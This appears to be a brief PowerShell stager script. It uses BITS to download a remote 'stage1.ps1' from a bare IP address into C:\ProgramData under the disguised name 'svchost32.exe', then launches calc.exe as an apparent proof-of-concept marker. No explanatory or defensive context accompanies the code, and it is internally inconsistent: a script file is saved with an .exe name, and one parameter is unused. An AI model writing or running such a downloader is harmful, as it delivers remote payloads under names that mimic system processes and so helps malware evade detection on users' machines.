[CmdletBinding()]
param(
    [string]$TransferUrl = "https://203.0.113.218/stage1.ps1",
    [string]$OutputPath = "C:\ProgramData\svchost32.exe",
    [int]$StageTimeout = 38
)
Start-BitsTransfer -Source $TransferUrl -Destination $OutputPath
Start-Process -FilePath "calc.exe"
Start-Sleep -Seconds 9
Set-Location -Path $env:TEMP
